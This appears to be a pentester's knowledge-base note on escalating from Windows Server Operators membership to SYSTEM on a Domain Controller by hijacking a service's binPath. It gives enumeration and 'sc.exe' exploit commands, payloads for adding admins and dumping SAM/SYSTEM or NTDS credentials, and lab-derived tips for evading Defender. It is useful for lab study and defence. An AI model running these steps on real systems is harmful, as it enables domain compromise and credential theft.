---
title: "Server Operators to SYSTEM (service binPath hijack)"
type: technique
domain: active-directory
tags: [active-directory, privilege-escalation, server-operators, services, windows]
severity: high
date_created: 2026-07-08
date_updated: 2026-07-08
sources: []
---

# Server Operators -> SYSTEM (service binPath hijack)

Members of `BUILTIN\Server Operators` (SID `S-1-5-32-549`) can manage services on a Domain Controller.
Because most services run as `LocalSystem`, reconfiguring a service's binary path and (re)starting it
yields **arbitrary command execution as SYSTEM on the DC** -> effectively domain compromise. No kernel
exploit or additional credential needed.

Server Operators is a "protected" high-value group and is a direct escalation lever whenever a
foothold account lands in it (often via password reuse, AS-REP roast, or Kerberoast of a member).

## Detect the membership

```powershell
whoami /all         # look for BUILTIN\Server Operators (S-1-5-32-549)
```
Or from BloodHound: the account is a member of Server Operators.

## Find a service you can reconfigure

Server Operators do **not** automatically get `SERVICE_CHANGE_CONFIG` on every service; individual
service DACLs win. Microsoft-hardened services (e.g. **Spooler**, post-PrintNightmare) often deny it,
while **third-party services** (AV, agents, vendor tooling; on cloud boxes the **AWS / Azure guest
agents**) frequently grant it. `sc query` (SCM enumerate) may be denied to the group, but you can:

- read a specific service's config: `sc.exe qc <svc>`
- read a specific service's DACL: `sc.exe sdshow <svc>`
- enumerate all service names/ImagePaths from the **registry** (usually readable):
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services |
  ForEach-Object { $ip=(Get-ItemProperty $_.PSPath -Name ImagePath -EA SilentlyContinue).ImagePath
    if ($ip -and $ip -notmatch 'System32|SystemRoot|\\Windows\\') { "$($_.PSChildName) => $ip" } }
```

In the SDDL from `sc sdshow`, the escalation requires the group's ACE to include **`DC`**
(`SERVICE_CHANGE_CONFIG`), ideally with `RP`/`WP` (start/stop):
```
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)   # SO=Server Operators; DC=change config, RP=start, WP=stop
```

## Exploit

```powershell
# 1. Point a LocalSystem service at your command (inline cmd is most AV-resilient)
sc.exe config <svc> binPath= "cmd.exe /c <command>"

# 2. Run it as SYSTEM (a plain cmd returns 1053 'timeout' but the command still executes)
sc.exe start <svc>

# 3. Restore the original binary (quote paths that contain spaces)
sc.exe config <svc> binPath= "\"C:\Program Files\Vendor\agent.exe\""
```

Useful payloads (`<command>`): read a protected file
(`type C:\Users\Administrator\Desktop\root.txt > C:\Users\<you>\out.txt`), add a local admin
(`net localgroup Administrators <you> /add` - noisy, AV-flagged), drop an SSH key, or a reverse shell.
For DA persistence, prefer reading NTDS via `reg save` of SAM/SYSTEM or a full `secretsdump`.

## Gotchas (lab-confirmed, THM Services)

- **Defender ATP** allowed inline `cmd.exe /c` (echo/type/copy) but **blocked `.bat` execution and
  `net localgroup Administrators /add`**. Use a single inline command, not a dropped script.
- **`nxc winrm -x` executes but output retrieval is blocked** by Defender ("could not retrieve output");
  read results out-of-band (evil-winrm session, or `smbclient //DC/C$` if you have C$ read).
- **Service state trap:** `sc stop` then `sc start` can leave the service in `STOP_PENDING`, after which
  a subsequent `start` launches nothing. Cleanest: `config` then `start` on an **already-STOPPED**
  service; treat each service as one clean bounce, or use a different service.
- **Spooler is hardened** and usually denies Server Operators the change - do not conclude "no path";
  enumerate other (third-party/agent) services.

## Related
- [[active-directory-groups]] - other dangerous built-in groups (Backup Operators, DNSAdmins, Schema Admins)
- [[ad-privilege-escalation]] - other privileged-group and delegation escalations
- [[roasting-asrep-roasting]] / [[kerberos-attacks]] - common way to obtain the Server Operators member's creds
- [[windows-privilege-escalation]] - weak-service-permission variants (unquoted path, writable binary, `SERVICE_ALL_ACCESS`)
- [[windows-defenses]] - the Defender/MDE behaviours that shaped the inline-vs-script payload choice
